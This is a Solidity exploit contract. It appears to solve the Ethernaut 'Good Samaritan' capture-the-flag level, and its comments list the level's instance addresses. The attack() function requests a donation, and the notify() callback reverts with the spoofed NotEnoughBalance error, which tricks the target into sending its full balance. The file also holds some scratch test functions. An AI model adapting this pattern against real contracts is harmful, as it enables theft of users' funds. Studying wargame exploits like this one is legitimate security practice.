// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

// samaritan 0xBf2CD25A831538303B43dB559810E4F139fa980c
// wallet  0x325F0ab967760054E9a9a26a94e4B957DCe374e1
// coin   0xc41e4A39756d9a81AE1eeec50e4DFB05c15B2Cf0

interface INotifyable {
    function notify(uint256 amount) external;
}




contract AlaMyContract is INotifyable {
    event Log(bool success);
    event notifyLog(uint256 number);
    
    error NotEnoughBalance();

    function testtest() external pure{
        revert NotEnoughBalance();
    }

    function test() public view returns(uint){
        try this.testtest() {
            return 1;
        } catch(bytes memory err){
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                return 200;
            }
            return 1000;
        }
    }



    function attack(address _target) public {
        IGoodSamaritan(_target).requestDonation();
        // emit Log(result);
    }
    function notify(uint256 amount) external pure{
        // emit notifyLog(amount);
        // revert NotEnoughBalance();
        if (amount==10) {
            revert NotEnoughBalance();
        } 
    }
    receive() external payable { }
    function withdraw()  public returns(bool) {
        (bool result, ) = payable (msg.sender).call{value: address(this).balance}("");
        return result;
    }

    function checkBalance() public view returns(uint) {
        return address(this).balance;
    }
}

interface IGoodSamaritan {
    function requestDonation() external returns(bool enoughBalance);
}

interface ICoin {
    function balances(address _target) external view returns(uint256 balance);
}
